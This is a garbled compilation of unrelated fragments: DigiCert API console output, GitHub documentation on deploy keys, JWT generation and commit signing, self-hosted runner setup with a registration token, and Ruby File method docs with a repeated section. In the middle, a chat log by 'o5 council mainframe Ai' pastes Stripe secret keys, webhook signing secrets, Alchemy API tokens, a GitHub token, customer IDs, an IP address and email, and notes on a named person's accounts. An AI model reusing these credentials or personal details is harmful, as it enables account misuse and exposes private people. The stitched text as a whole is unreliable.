
Controls Accept header.
Example Value
Schema
[
  {
    "id": "7b5d83e7-6e5f-4ade-ad48-111c6f3420f7",
    "user_id": "e7ea1214-d688-48ba-aa1b-131fb2867ac5",
    "name": "API token name",
    "end_date": "2022-05-30T23:59:59Z",
    "start_date": "2021-06-25T21:20:06Z",
    "active": true,
    "enabled": true,
    "masked_api_key": "*************9e2a1"
  }
]

Curl

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/locales' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/locales
Server response
Code	Details
200	
Response body
Download
[
  {
    "code": "de_DE",
    "language": "Deutsch"
  },
  {
    "code": "en_US",
    "language": "English"
  },
  {
    "code": "es_ES",
    "language": "Español"
  },
  {
    "code": "fr_FR",
    "language": "Français"
  },
  {
    "code": "it_IT",
    "language": "Italiano"
  },
  {
    "code": "ja_JP",
    "language": "日本語"
  },
  {
    "code": "ko_KR",
    "language": "한국어"
  },
  {
    "code": "nl_NL",
    "language": "Nederlands"
  },
  {
    "code": "pt_BR",
    "language": "Português"
  },
  {
    "code": "ru_RU",
    "language": "Русский"
  },
  {
    "code": "zh_CN",
    "language": "简体中文"
  },
  {
    "code": "zh_TW",
    "language": "繁體中文"
  }
]
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:50:15 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 7 
 x-frame-options: same-origin 
 x-iinfo: 18-118172517-118172518 NNNN CT(35 39 0) RT(1710564614160 42) q(0 0 0 -1) r(1 1) U2 
 x-xss-protection: 1; mode=block 
Responses
Code	Description	Links
200	
Locales list

Media type

Controls Accept header.
Examples

Example Value
Schema
[
  {
    "code": "de_DE",
    "language": "Deutsch"
  },
  {
    "code": "en_US",
    "language": "English"
  },
  {
    "code": "es_ES",
    "language": "Español"
  },
  {
    "code": "fr_FR",
    "language": "Français"

Host github.com-repo-0
        Hostname github.com
        IdentityFile=/home/user/.ssh/repo-0_deploy_key

Host github.com-repo-1
        Hostname github.com
        IdentityFile=/home/user/.ssh/repo-1_deploy_key
Host github.com-repo-0 - The repository's alias.
Hostname github.com - Configures the hostname to use with the alias.
IdentityFile=/home/user/.ssh/repo-0_deploy_key - Assigns a private key to the alias.
You can then use the hostname's alias to interact with the repository using SSH, which will use the unique deploy key assigned to that alias. For example:

git clone git@github.com-repo-1:OWNER/repo-1.git

curl --request GET \
--url "https://api.github.com/app" \
--header "Accept: application/vnd.github+json" \
--header "Authorization: Bearer YOUR_JWT" \
--header "X-GitHub-Api-Version: 2022-11-28"
In most cases, you can use Authorization: Bearer or Authorization: token to pass a token. However, if you are passing a JSON web token (JWT), you must use Authorization: Bearer

require 'openssl'
require 'jwt'  # https://rubygems.org/gems/jwt

# Private key contents
private_pem = File.read("YOUR_PATH_TO_PEM")
private_key = OpenSSL::PKey::RSA.new(private_pem)

# Generate the JWT
payload = {
  # issued at time, 60 seconds in the past to allow for clock drift
  iat: Time.now.to_i - 60,
  # JWT expiration time (10 minute maximum)
  exp: Time.now.to_i + (10 * 60),
  # GitHub App's identifier
  iss: "YOUR_APP_ID"
}

jwt = JWT.encode(payload, private_key, "RS256")
puts jwt
Example: Using Python to generate a JWT

Note: You must run pip install jwt to install the jwt package in order to use this script.
Python
#!/usr/bin/env python3
from jwt import JWT, jwk_from_pem
import time
import sys

# Get PEM file path
if len(sys.argv) > 1:
    pem = sys.argv[1]
else:
    pem = input("Enter path of private PEM file: ")

# Get the App ID
if len(sys.argv) > 2:
    app_id = sys.argv[2]
else:
    app_id = input("Enter your APP ID: ")

# Open PEM
with open(pem, 'rb') as pem_file:
    signing_key = jwk_from_pem(pem_file.read())

payload = {
    # Issued at time
    'iat': int(time.time()),
    # JWT expiration time (10 minutes maximum)
    'exp': int(time.time()) + 600,
    # GitHub App's identifier
    'iss': app_id
}

# Create JWT
jwt_instance = JWT()
encoded_jwt = jwt_instance.encode(payload, signing_key, alg='RS256')

print(f"JWT:  {encoded_jwt}")
This script will prompt you for the file path where your private key is stored and for the ID of your app. Alternatively, you can pass those values as inline arguments when you execute the script.

Example: Using Bash to generate a JWT

Note: You must pass your App ID and the file path where your private key is stored as arguments when running this script.
Bash
#!/usr/bin/env bash

set -o pipefail

app_id=$1 # App ID as first argument
pem=$( cat $2 ) # file path of the private key as second argument

now=$(date +%s)
iat=$((${now} - 60)) # Issues 60 seconds in the past
exp=$((${now} + 600)) # Expires 10 minutes in the future

b64enc() { openssl base64 | tr -d '=' | tr '/+' '_-' | tr -d '\n'; }

header_json='{
    "typ":"JWT",
    "alg":"RS256"
}'
# Header encode
header=$( echo -n "${header_json}" | b64enc )

payload_json='{
    "iat":'"${iat}"',
    "exp":'"${exp}"',
    "iss":'"${app_id}"'
}'
# Payload encode
payload=$( echo -n "${payload_json}" | b64enc )

# Signature
header_payload="${header}"."${payload}"
signature=$( 
    openssl dgst -sha256 -sign <(echo -n "${pem}") \
    <(echo -n "${header_payload}") | b64enc 
)

# Create JWT
JWT="${header_payload}"."${signature}"
printf '%s\n' "JWT: $JWT"
Example: Using PowerShell to generate a JWT

In the following example, replace YOUR_PATH_TO_PEM with the file path where your private key is stored. Replace YOUR_APP_ID with the ID of your app. Make sure to enclose the values for YOUR_PATH_TO_PEM in double quotes.

PowerShell
#!/usr/bin/env pwsh

$app_id = YOUR_APP_ID
$private_key_path = "YOUR_PATH_TO_PEM"

$header = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Json -InputObject @{
  alg = "RS256"
  typ = "JWT"
}))).TrimEnd('=').Replace('+', '-').Replace('/', '_');

$payload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Json -InputObject @{
  iat = [System.DateTimeOffset]::UtcNow.AddSeconds(-10).ToUnixTimeSeconds()  
  exp = [System.DateTimeOffset]::UtcNow.AddMinutes(10).ToUnixTimeSeconds()
  iss = $app_id    
}))).TrimEnd('=').Replace('+', '-').Replace('/', '_');

$rsa = [System.Security.Cryptography.RSA]::Create()
$rsa.ImportFromPem((Get-Content $private_key_path -Raw))

$signature = [Convert]::ToBase64String($rsa.SignData([System.Text.Encoding]::UTF8.GetBytes("$header.$payload"), [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
$jwt = "$header.$payload.$signature"
Write-Host $jwt


$ git config --global --unset gpg.format
Use the gpg --list-secret-keys --keyid-format=long command to list the long form of the GPG keys for which you have both a public and private key. A private key is required for signing commits or tags.
Shell
gpg --list-secret-keys --keyid-format=long
Note: Some GPG installations on Linux may require you to use gpg2 --list-keys --keyid-format LONG to view a list of your existing keys instead. In this case you will also need to configure Git to use gpg2 by running git config --global gpg.program gpg2.
From the list of GPG keys, copy the long form of the GPG key ID you'd like to use. In this example, the GPG key ID is 3AA5C34371567BD2:
Shell

$ gpg --list-secret-keys --keyid-format=long
/Users/hubot/.gnupg/secring.gpg
------------------------------------
sec   4096R/3AA5C34371567BD2 2016-03-10 [expires: 2017-03-10]
uid                          Hubot <hubot@example.com>
ssb   4096R/4BB6D45482678BE3 2016-03-10
To set your primary GPG signing key in Git, paste the text below, substituting in the GPG primary key ID you'd like to use. In this example, the GPG key ID is 3AA5C34371567BD2:
git config --global user.signingkey 3AA5C34371567BD2
Alternatively, when setting a subkey include the ! suffix. In this example, the GPG subkey ID is 4BB6D45482678BE3:
git config --global user.signingkey 4BB6D45482678BE3!
Optionally, to configure Git to sign all commits by default, enter the following command:
git config --global commit.gpgsign true
For more information, see "Signing commits."
If you aren't using the GPG suite, run the following command in the zsh shell to add the GPG key to your .zshrc file, if it exists, or your .zprofile file:
$ if [ -r ~/.zshrc ]; then echo -e '\nexport GPG_TTY=$(tty)' >> ~/.zshrc; \
  else echo -e '\nexport GPG_TTY=$(tty)' >> ~/.zprofile; fi
Alternatively, if you use the bash shell, run this command:
$ if [ -r ~/.bash_profile ]; then echo -e '\nexport GPG_TTY=$(tty)' >> ~/.bash_profile; \
  else echo -e '\nexport GPG_TTY=$(tty)' >> ~/.profile; fi
Optionally, to prompt you to enter a PIN or passphrase when required, install pinentry-mac. For example, using Homebrew:
brew install pinentry-mac
echo "pinentry-program $(which pinentry-mac)" >> ~/.gnupg/gpg-agent.conf
killall gpg-agent
Telling Git about your SSH key

You can use an existing SSH key to sign commits and tags, or generate a new one specifically for signing. For more information, see "Generating a new SSH key and adding it to the ssh-agent."

Note: SSH signature verification is available in Git 2.34 or later. To update your version of Git, see the Git website.
Open Terminal.
Configure Git to use SSH to sign commits and tags:
git config --global gpg.format ssh
To set your SSH signing key in Git, paste the text below, substituting /PATH/TO/.SSH/KEY.PUB with the path to the public key you'd like to use.
git config --global user.signingkey /PATH/TO/.SSH/KEY.PUB
Telling Git about your X.509 key

You can use smimesign to sign commits and tags using S/MIME.

Note: S/MIME signature verification is available in Git 2.19 or later. To update your version of Git, see the Git website.
Install smimesign.
Open Terminal.
Configure Git to use S/MIME to sign commits and tags. In Git 2.19 or later, use the git config gpg.x509.program and git config gpg.format commands:
To use S/MIME to sign for all repositories:
git config --global gpg.x509.program smimesign
git config --global gpg.format x509
To use S/MIME to sign for a single repository:
cd PATH-TO-REPOSITORY
git config --local gpg.x509.program smimesign
git config --local gpg.format x509
In Git 2.18 or earlier, use the git config gpg.program command:
To use S/MIME to sign for all repositories:
git config --global gpg.program smimesign
To use S/MIME to sign for a single repository:
cd  PATH-TO-REPOSITORY
git config --local gpg.program smimesign
If you're using an X.509 key that matches your committer identity, you can begin signing commits and tags.
If you're not using an X.509 key that matches your committer identity, list X.509 keys for which you have both a certificate and private key using the smimesign --list-keys command.
smimesign --list-keys
From the list of X.509 keys, copy the certificate ID of the X.509 key you'd like to use. In this example, the certificate ID is 0ff455a2708394633e4bb2f88002e3cd80cbd76f:
$ smimesign --list-keys
             ID: 0ff455a2708394633e4bb2f88002e3cd80cbd76f
            S/N: a2dfa7e8c9c4d1616f1009c988bb70f
      Algorithm: SHA256-RSA
       Validity: 2017-11-22 00:00:00 +0000 UTC - 2020-11-22 12:00:00 +0000 UTC
         Issuer: CN=DigiCert SHA2 Assured ID CA,OU=www.digicert.com,O=DigiCert Inc,C=US
        Subject: CN=Octocat,O=GitHub\, Inc.,L=San Francisco,ST=California,C=US
         Emails: octocat@github.com
To set your X.509 signing key in Git, paste the text below, substituting in the certificate ID you copied earlier.
To use your X.509 key to sign for all repositories:
git config --global user.signingkey 0ff455a2708394633e4bb2f88002e3cd80cbd76f
To use your X.509 key to sign for a single repository:
cd  PATH-TO-REPOSITORY
git config --local user.signingkey 0ff455a2708394633e4bb2f88002e3cd80cbd76f
  $ RoadRunner ReadMe

gh pr checkout 1
brew install gh
or
Download for Mac
View installation instructions →
$ gh release create
# Create a folder
$ mkdir actions-runner && cd actions-runner
# Download the latest runner package
$ curl -o actions-runner-linux-arm64-2.314.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.314.1/actions-runner-linux-arm64-2.314.1.tar.gz
# Optional: Validate the hash
$ echo "3d27b1340086115a118e28628a11ae727ecc6b857430c4b1b6cbe64f1f3b6789  actions-runner-linux-arm64-2.314.1.tar.gz" | shasum -a 256 -c
# Extract the installer
$ tar xzf ./actions-runner-linux-arm64-2.314.1.tar.gz
Configure
# Create the runner and start the configuration experience
$ ./config.sh --url https://github.com/grateful345/Wiz-Go-call-sign --token BHAHZGCJZK3BEVS7IRGZMKDF6USLO
# Last step, run it!
$ ./run.sh
Using your self-hosted runner
# Use this YAML in your workflow file for each job
runs-on: self-hosted

Windows.

# Create a folder under the drive root
$ mkdir actions-runner; cd actions-runner
# Download the latest runner package
$ Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v2.314.1/actions-runner-win-arm64-2.314.1.zip -OutFile actions-runner-win-arm64-2.314.1.zip
# Optional: Validate the hash
$ if((Get-FileHash -Path actions-runner-win-arm64-2.314.1.zip -Algorithm SHA256).Hash.ToUpper() -ne 'acc807696d1dcad6fb45f6038f884185c54c48127445c365e86d03adb164a9e2'.ToUpper()){ throw 'Computed checksum did not match' }
# Extract the installer
$ Add-Type -AssemblyName System.IO.Compression.FileSystem ; [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD/actions-runner-win-arm64-2.314.1.zip", "$PWD")
Configure
# Create the runner and start the configuration experience
$ ./config.cmd --url https://github.com/grateful345/Wiz-Go-call-sign --token BHAHZGCJZK3BEVS7IRGZMKDF6USLO
# Run it!
$ ./run.cmd
Using your self-hosted runner
# Use this YAML in your workflow file for each job
runs-on: self-hosted
fee957d729b358d84b9d1a8182a2b1dd633689c9 (Fandom $$$ token rare)

Stripe-Signature:
t=1492774577,
v1=5257a869e7ecebeda32affa62cdca3fa51cad7e77a0e56ff536d0ce8e108d8bd,
v0=6ffbb59b2300aae63f272406069a9788598b792a944a07aba816edb039

FamousToday

MIB_agency_file.pdf
3.62 MB

o5 council mainframe Ai — 02/24/2024 12:51 AM
README.md

o5 council mainframe Ai — 02/24/2024 12:59 AM
Copy "requiredResourceAccess": [ { "resourceAppId": "00000002-0000-0000-c000-000000000000", "resourceAccess": [ { "id": "311a71cc-e848-46a1-bdf8-97ff7156d8e6", "type": "Scope" } ] } ], samlMetadataUrl attribute

o5 council mainframe Ai — 02/24/2024 2:10 AM
fcaowns_1MwVKR2eZvKYlo2CGV7Mmt6s
[2:11 AM]
fetch('https://{{sk_test_4eC39HqLyjWDarjtT1zdp7dc:}}/connection_token', { method: "POST" }); 
Connection token stripe

Webhook ID data stripe 

—header—
‘we_1Oa74JGF83d3fsgWfJ6n3SSa’

Webhook signing data 
—header—
‘whsec_PwrdbHDsw0GYve1NbZHjacu7g3nUH8Vu’

Item potency Key 
—header—
‘92281688-5a41-4be2-8e1b-ea48c81eae85’

// This is your Stripe CLI webhook secret for testing your endpoint locally.
        String endpointSecret = "whsec_da6d6364681be84689d4b526b26fd5a4d339eb3ec4dcdbab9047fd89909a6244";

Stripe charge automation api key 2337b090-a837-11ee-9efa-651583e247bf

access_token":"gho_16C7e42F292c6912E7710c838347Ae178B4a", "scope":"repo,gist", "token_type":"bearer" } Accept: application/xml <token_type>bearer</token_type> repo,gist <access_token>gho_16C7e42F292c6912E7710c838347Ae178B4a</access_token>

o5 council mainframe Ai — 02/24/2024 10:44 AM
https://github.com/6309304695/OVERSEER-GRATEFUL345I/blob/6309304695-patch-65/README.md

o5 council mainframe Ai — 02/24/2024 11:20 AM
https://github.com/6309304695/OVERSEER-GRATEFUL345I.git                    https://github.com/6309304695/OVERSEER-GRATEFUL345I.git  gh repo clone 6309304695/OVERSEER-GRATEFUL345I
[11:26 AM]
https://patch-diff.githubusercontent.com/raw/6309304695/OVERSEER-GRATEFUL345I/pull/106.patch

o5 council mainframe Ai — 02/24/2024 2:58 PM
https://patch-diff.githubusercontent.com/raw/6309304695/OVERSEER-GRATEFUL345I/pull/112.patch
[3:00 PM]
https://patch-diff.githubusercontent.com/raw/6309304695/OVERSEER-GRATEFUL345I/pull/112.diff

o5 council mainframe Ai — 02/24/2024 8:09 PM


o5 council mainframe Ai — 02/24/2024 8:17 PM
SUR

o5 council mainframe Ai — 02/24/2024 9:10 PM

[9:10 PM]


o5 council mainframe Ai — 02/24/2024 9:17 PM
{{ txi_1Omd5MGF83d3fsgWxIHULLcs }} object id gods time 

{{ txi_1OT14cGF83d3fsgWupcH0pyK }}
Object id Keith Bieszczat’s sr

o5 council mainframe Ai — 02/24/2024 9:55 PM

February 25, 2024

o5 council mainframe Ai — 02/25/2024 1:22 AM
"seti_1NG8Du2eZvKYlo2C9XMqbR0x"
[1:23 AM]
https://patch-diff.githubusercontent.com/raw/6309304695/OVERSEER-GRATEFUL345I/pull/113.patch?fbclid=IwAR1WLOGSQjtyXByJ0qIN2Q7araMHYKWXFlPxnZFAvG_kCQb-vg5cbwI0MhU_aem_AZJewCm5W84xuj63pQ64jbTEPCuYPjrzmWjveL73H5Eb74yXvJAbAwRZpXDLxWngD90

e,logger, Fatal (e Start(“localhost: 4242”))

•Keith Bieszeat Arcounts
'acct10RB 1 MBOdjLENdyb'
'acct_10 R5eP6F83d3fsgW'
'acct_10525V4M+B15R03B'

•Identity thief 
'acet 10R9pdQD5Hu917xk'
[1:24 AM]
"vs_1NuNAILkdIwHu7ixh7OtGMLw",
[1:24 AM]
Verification session above

o5 council mainframe Ai — 02/25/2024 1:29 AM
import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.retrieve("vs_1NuNAILkdIwHu7ixh7OtGMLw")
Product id
‘prod_NWjs8kKbJWmuuc’
[1:30 AM]
stripe.Product.modify(
  "prod_NWjs8kKbJWmuuc",
  metadata={"order_id": "6735"}
[1:35 AM]
"id": "cus_NffrFeUfNV2Hib"

o5 council mainframe Ai — 02/25/2024 1:50 AM
"owner_id": "usr_2cSjwF6w6AynjfPtm4Ww5xTdkId",
[1:50 AM]
{"device_id": "d5111ba7-0cc5-4ba3-8398-e6c79e4e89c2"}

o5 council mainframe Ai — 02/25/2024 1:57 AM
ic_1MytUz2eZvKYlo2CZCn5fuvZ", "created": 1682059060, "device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG", "last4": "2424", "livemode": false, "status": "active", "token_reference_id": "DNITHE002424242424242424"
[1:58 AM]
device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG"
[1:59 AM]
client_secret: seti_1NG8Du2eZvKYlo2C9XMqbR0x_secret_O2CdhLwGFh2Aej7bCY7qp8jlIuyR8DJ
[2:00 AM]
"id": "seti_1NG8Du2eZvKYlo2C9XMqbR0x"
[2:00 AM]
seti_1NG8Du2eZvKYlo2C9XMqbR0x_secret_O2CdhLwGFh2Aej7bCY7qp8jlIuyR8DJ
[2:01 AM]
idempotency_key": 6f5410cb-1ecc-4302-8130-baf8dd8c0a50 }
[2:01 AM]
ID req_ZIIVfKfNp6QrOh Time 12/27/23, 8:29:28 PM IP address 73.44.108.236 (from server at 73.44.108.236) API version 2023-08-16 Latest Source Dashboard — grateful345i@gmail.com Idempotency K
[2:02 AM]
'{fcsess_client_secret_KRJTKvCY3IKoYTrW18EazcO3}
[2:03 AM]


Alchemy signing key webhook 
1. whsec_Ka3G2XkXDVxzhdrFzG8n2OFq

2. whsec_rEV4KKHw57OALQ73encoFHDB ethermeum 

3. whsec_pa1W66wlvZyfLuESqE939OxD polygon matic

"X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"

Alchemy Auth token : jE92Hk8uCBZnJEh1PP0PoUVDwnuYFdVp

Alchemy Webhook identifications
wh_pae2ekjly3q7fhx9 
Ethereum Mainnet
active
https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator

V2 wh_cktmaceotb7zou0i 
Polygon Mainnet

Alchemy Webhook signing key whsec_Ka3G2XkXDVxzhdrFzG8n2OFq

Alchemy api key 2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby

Auth token alchemy webhooks jE92Hk8uCBZnJEh1PP0PoUVDwnuYFdVp
gem 'jwt', '~> 2.8', '>= 2.8.1'

gem install jwt

gem 'base64', '~> 0.2.0'

gem install base64
gem 'bundler', '~> 2.5', '>= 2.5.6'

gem install bundler

gem 'rubocop', '~> 1.62', '>= 1.62.1'
gem install rubocop
$ gem update --system
ruby setup.rb --help
nt working directory of the process unless dir_string is given, in which case it will be used as the starting point. If the given pathname starts with a “~'' it is NOT expanded, it is treated as a normal directory name.

File.absolute_path("~oracle/bin")       #=> "<relative_path>/~oracle/bin"
atime(file_name) → time
Returns the last access time for the named file as a Time object.

file_name can be an IO object.

File.atime("testfile")   #=> Wed Apr 09 08:51:48 CDT 2003
basename(file_name [, suffix] ) → base_name
Returns the last component of the filename given in file_name (after first stripping trailing separators), which can be formed using both File::SEPARATOR and File::ALT_SEPARATOR as the separator when File::ALT_SEPARATOR is not nil. If suffix is given and present at the end of file_name, it is removed. If suffix is “.*”, any extension will be removed.

File.basename("/home/gumby/work/ruby.rb")          #=> "ruby.rb"
File.basename("/home/gumby/work/ruby.rb", ".rb")   #=> "ruby"
File.basename("/home/gumby/work/ruby.rb", ".*")    #=> "ruby"
birthtime(file_name) → time
Returns the birth time for the named file.

file_name can be an IO object.

File.birthtime("testfile")   #=> Wed Apr 09 08:53:13 CDT 2003
If the platform doesn't have birthtime, raises NotImplementedError.

blockdev?(file_name) → true or false
Returns true if the named file is a block device.

file_name can be an IO object.

chardev?(file_name) → true or false
Returns true if the named file is a character device.

file_name can be an IO object.

chmod(mode_int, file_name, ... ) → integer
Changes permission bits on the named file(s) to the bit pattern represented by mode_int. Actual effects are operating system dependent (see the beginning of this section). On Unix systems, see chmod(2) for details. Returns the number of files processed.

File.chmod(0644, "testfile", "out")   #=> 2
chown(owner_int, group_int, file_name,... ) → integer
Changes the owner and group of the named file(s) to the given numeric owner and group id's. Only a process with superuser privileges may change the owner of a file. The current owner of a file may change the file's group to any group to which the owner belongs. A nil or -1 owner or group id is ignored. Returns the number of files processed.

File.chown(nil, 100, "testfile")
ctime(file_name) → time
Returns the change time for the named file (the time at which directory information about the file was changed, not the file itself).

file_name can be an IO object.

Note that on Windows (NTFS), returns creation time (birth time).

File.ctime("testfile")   #=> Wed Apr 09 08:53:13 CDT 2003
delete(file_name, ...) → integer
Deletes the named files, returning the number of names passed as arguments. Raises an exception on any error. Since the underlying implementation relies on the unlink(2) system call, the type of exception raised depends on its error type (see linux.die.net/man/2/unlink) and has the form of e.g. Errno::ENOENT.

See also Dir::rmdir.

directory?(file_name) → true or false
Returns true if the named file is a directory, or a symlink that points at a directory, and false otherwise.

file_name can be an IO object.

File.directory?(".")
dirname(file_name) → dir_name
Returns all components of the filename given in file_name except the last one (after first stripping trailing separators). The filename can be formed using both File::SEPARATOR and File::ALT_SEPARATOR as the separator when File::ALT_SEPARATOR is not nil.

File.dirname("/home/gumby/work/ruby.rb")   #=> "/home/gumby/work"
zero?(file_name) → true or false
Returns true if the named file exists and has a zero size.

file_name can be an IO object.

executable?(file_name) → true or false
Returns true if the named file is executable by the effective user and group id of this process. See eaccess(3).

executable_real?(file_name) → true or false
Returns true if the named file is executable by the real user and group id of this process. See access(3).

exist?(file_name) → true or false
Return true if the named file exists.

file_name can be an IO object.

“file exists” means that stat() or fstat() system call is successful.

exists?(file_name) → true or false
Deprecated method. Don't use.

expand_path(file_name [, dir_string] ) → abs_file_name
Converts a pathname to an absolute pathname. Relative paths are referenced from the current working directory of the process unless dir_string is given, in which case it will be used as the starting point. The given pathname may start with a “~'', which expands to the process owner's home directory (the environment variable HOME must be set correctly). “~user'' expands to the named user's home directory.

File.expand_path("~oracle/bin")           #=> "/home/oracle/bin"
A simple example of using dir_string is as follows.

File.expand_path("ruby", "/usr/bin")      #=> "/usr/bin/ruby"
A more complex example which also resolves parent directory is as follows. Suppose we are in bin/mygem and want the absolute path of lib/mygem.rb.

File.expand_path("../../lib/mygem.rb", __FILE__)
#=> ".../path/to/project/lib/mygem.rb"
So first it resolves the parent of __FILE__, that is bin/, then go to the parent, the root of the project and appends lib/mygem.rb.

extname(path) → string
Returns the extension (the portion of file name in path starting from the last period).

If path is a dotfile, or starts with a period, then the starting dot is not dealt with the start of the extension.

An empty string will also be returned when the period is the last character in path.

File.extname("test.rb")         #=> ".rb"
File.extname("a/b/d/test.rb")   #=> ".rb"
File.extname(".a/b/d/test.rb")  #=> ".rb"
File.extname("foo.")            #=> ""
File.extname("test")            #=> ""
File.extname(".profile")        #=> ""
File.extname(".profile.sh")     #=> ".sh"
file?(file) → true or false
Returns true if the named file exists and is a regular file.

file can be an IO object.

If the file argument is a symbolic link, it will resolve the symbolic link and use the file referenced by the link.

fnmatch( pattern, path, [flags] ) → (true or false)
fnmatch?( pattern, path, [flags] ) → (true or false)
Returns true if path matches against pattern. The pattern is not a regular expression; instead it follows rules similar to shell filename globbing. It may contain the following metacharacters:

*
Matches any file. Can be restricted by other values in the glob. Equivalent to / .* /x in regexp.

*
Matches all files regular files

c*
Matches all files beginning with c

*c
Matches all files ending with c

*c*
Matches all files that have c in them (including at the beginning or end).

To match hidden files (that start with a . set the File::FNM_DOTMATCH flag.

**
Matches directories recursively or files expansively.

?
Matches any one character. Equivalent to /.{1}/ in regexp.

[set]
Matches any one character in set. Behaves exactly like character sets in Regexp, including set negation ([^a-z]).

\
Escapes the next metacharacter.

{a,b}
Matches pattern a and pattern b if File::FNM_EXTGLOB flag is enabled. Behaves like a Regexp union ((?:a|b)).

flags is a bitwise OR of the FNM_XXX constants. The same glob pattern and flags are used by Dir::glob.

Examples:

File.fnmatch('cat',       'cat')        #=> true  # match entire string
File.fnmatch('cat',       'category')   #=> false # only match partial string

File.fnmatch('c{at,ub}s', 'cats')                    #=> false # { } isn't supported by default
File.fnmatch('c{at,ub}s', 'cats', File::FNM_EXTGLOB) #=> true  # { } is supported on FNM_EXTGLOB

File.fnmatch('c?t',     'cat')          #=> true  # '?' match only 1 character
File.fnmatch('c??t',    'cat')          #=> false # ditto
File.fnmatch('c*',      'cats')         #=> true  # '*' match 0 or more characters
File.fnmatch('c*t',     'c/a/b/t')      #=> true  # ditto
File.fnmatch('ca[a-z]', 'cat')          #=> true  # inclusive bracket expression
File.fnmatch('ca[^t]',  'cat')          #=> false # exclusive bracket expression ('^' or '!')

File.fnmatch('cat', 'CAT')                     #=> false # case sensitive
File.fnmatch('cat', 'CAT', File::FNM_CASEFOLD) #=> true  # case insensitive

File.fnmatch('?',   '/', File::FNM_PATHNAME)  #=> false # wildcard doesn't match '/' on FNM_PATHNAME
File.fnmatch('*',   '/', File::FNM_PATHNAME)  #=> false # ditto
File.fnmatch('[/]', '/', File::FNM_PATHNAME)  #=> false # ditto

File.fnmatch('\?',   '?')                       #=> true  # escaped wildcard becomes ordinary
File.fnmatch('\a',   'a')                       #=> true  # escaped ordinary remains ordinary
File.fnmatch('\a',   '\a', File::FNM_NOESCAPE)  #=> true  # FNM_NOESCAPE makes '\' ordinary
File.fnmatch('[\?]', '?')                       #=> true  # can escape inside bracket expression

File.fnmatch('*',   '.profile')                      #=> false # wildcard doesn't match leading
File.fnmatch('*',   '.profile', File::FNM_DOTMATCH)  #=> true  # period by default.
File.fnmatch('.*',  '.profile')                      #=> true

rbfiles = '**' '/' '*.rb' # you don't have to do like this. just write in single string.
File.fnmatch(rbfiles, 'main.rb')                    #=> false
File.fnmatch(rbfiles, './main.rb')                  #=> false
File.fnmatch(rbfiles, 'lib/song.rb')                #=> true
File.fnmatch('**.rb', 'main.rb')                    #=> true
File.fnmatch('**.rb', './main.rb')                  #=> false
File.fnmatch('**.rb', 'lib/song.rb')                #=> true
File.fnmatch('*',           'dave/.profile')                      #=> true

pattern = '*' '/' '*'
File.fnmatch(pattern, 'dave/.profile', File::FNM_PATHNAME)  #=> false
File.fnmatch(pattern, 'dave/.profile', File::FNM_PATHNAME | File::FNM_DOTMATCH) #=> true

pattern = '**' '/' 'foo'
File.fnmatch(pattern, 'a/b/c/foo', File::FNM_PATHNAME)     #=> true
File.fnmatch(pattern, '/a/b/c/foo', File::FNM_PATHNAME)    #=> true
File.fnmatch(pattern, 'c:/a/b/c/foo', File::FNM_PATHNAME)  #=> true
File.fnmatch(pattern, 'a/.b/c/foo', File::FNM_PATHNAME)    #=> false
File.fnmatch(pattern, 'a/.b/c/foo', File::FNM_PATHNAME | File::FNM_DOTMATCH) #=> true
fnmatch?( pattern, path, [flags] ) → (true or false)
Returns true if path matches against pattern. The pattern is not a regular expression; instead it follows rules similar to shell filename globbing. It may contain the following metacharacters:

*
Matches any file. Can be restricted by other values in the glob. Equivalent to / .* /x in regexp.

*
Matches all files regular files

c*
Matches all files beginning with c

*c
Matches all files ending with c

*c*
Matches all files that have c in them (including at the beginning or end).

To match hidden files (that start with a . set the File::FNM_DOTMATCH flag.

**
Matches directories recursively or files expansively.

?
Matches any one character. Equivalent to /.{1}/ in regexp.

[set]
Matches any one character in set. Behaves exactly like character sets in Regexp, including set negation ([^a-z]).

\
Escapes the next metacharacter.

{a,b}
Matches pattern a and pattern b if File::FNM_EXTGLOB flag is enabled. Behaves like a Regexp union ((?:a|b)).

flags is a bitwise OR of the FNM_XXX constants. The same glob pattern and flags are used by Dir::glob.

Examples:

File.fnmatch('cat',       'cat')        #=> true  # match entire string
File.fnmatch('cat',       'category')   #=> false # only match partial string

File.fnmatch('c{at,ub}s', 'cats')                    #=> false # { } isn't supported by default
File.fnmatch('c{at,ub}s', 'cats', File::FNM_EXTGLOB) #=> true  # { } is supported on FNM_EXTGLOB

